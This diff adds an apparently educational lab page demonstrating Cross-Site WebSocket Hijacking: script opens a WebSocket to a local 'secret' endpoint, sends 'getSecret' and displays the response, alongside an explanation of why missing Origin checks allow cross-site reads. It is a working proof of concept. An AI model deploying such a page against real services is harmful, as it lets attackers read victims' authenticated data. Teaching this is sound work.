@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>CSWSH Attack Page</title>
+</head>
+<body>
+<script>
+	var conn = null;
+	function handshake(){
+		conn = new WebSocket("ws://localhost:8000/secret");
+		conn.onopen = function(){
+			alert("Handshake successful");
+		}
+	}
+
+	function cswsh(){
+		if(conn == null){
+			alert('Click "Handshake" first');
+			return;
+		}
+		conn.onmessage = function (e) {
+		  alert("Hijacked content: \n" + e.data);
+		}
+
+		conn.send("getSecret");
+	}
+</script>
+<center>
+<p>Similar to frequent CSRF attack scenarios, WebSocket connections are sometimes only validated by checking whether the user has a valid<br>
+session token or not, instead of making sure that there's an authenticity token sent along with the request, or a valid value for the Origin header.<br>
+In this scenario, the server only checks if the request is eligible to continue the handshake process or not by checking whether there's a valid session token in the upgrading request or not.<br>Unlike all the other CSRF cases, WebSocket connections are NOT subject to the Same Origin Policy (SOP), nor<br>
+Cross Site Resource Sharing (CORS) rules, which gives the attacker not only the ability to issue blind requests, but to also read responses.<br>
+Click "Handshake" to start a handshake with the "Secret" app, an alert box will show up confirming the handshake.<br>
+Then click "Show Secret" to issue a WebSocket request that retreives the secret message from the server.<br>
+This is where the CSRF-like behavior appears, but with the ability to read the response.</p>
+<a href="http://www.christian-schneider.net/CrossSiteWebSocketHijacking.html">Original Writeup</a><br><br>
+<button onclick="handshake()">Handshake</button>
+<button onclick="cswsh()">Show Secret</button>
+</center>
+</body>
+</html>
